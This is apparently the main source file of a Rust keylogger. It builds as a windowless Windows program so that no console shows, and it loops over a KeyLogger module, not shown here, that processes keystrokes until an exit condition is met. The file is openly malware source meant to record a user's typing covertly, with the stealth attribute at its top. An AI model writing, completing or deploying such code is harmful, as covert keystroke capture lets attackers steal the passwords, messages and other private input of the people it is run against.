#![cfg_attr(windows, windows_subsystem = "windows")]

mod keylogger;
use keylogger::KeyLogger;
use std::time::Duration;

fn main() {
    let mut key_logger = KeyLogger::new().expect("Failed to initialize KeyLogger");
    loop {
        key_logger.process_keys();
        if key_logger.should_exit() {
            key_logger.finalize().expect("Failed to finalize KeyLogger");
            break;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
}